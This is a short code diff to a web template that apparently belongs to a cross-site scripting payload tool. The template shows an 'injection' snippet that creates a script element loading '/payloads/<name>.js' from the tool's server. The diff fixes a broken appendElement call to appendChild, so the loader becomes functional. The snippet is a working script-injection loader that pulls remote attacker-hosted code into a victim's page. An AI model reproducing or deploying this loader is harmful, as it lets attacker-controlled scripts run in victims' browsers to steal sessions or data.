@@ -23,7 +23,7 @@
 				<div class="injection">
 					var x = document.createElement('script');
 					x.src = '<%= request.scheme %>://<%= request.host %>:<%= request.port %>/payloads/<%= entry.shortname %>.js';
-					document.body.appendElement(x);
+					document.body.appendChild(x);
 				</div>
 			</td>
 		</tr>
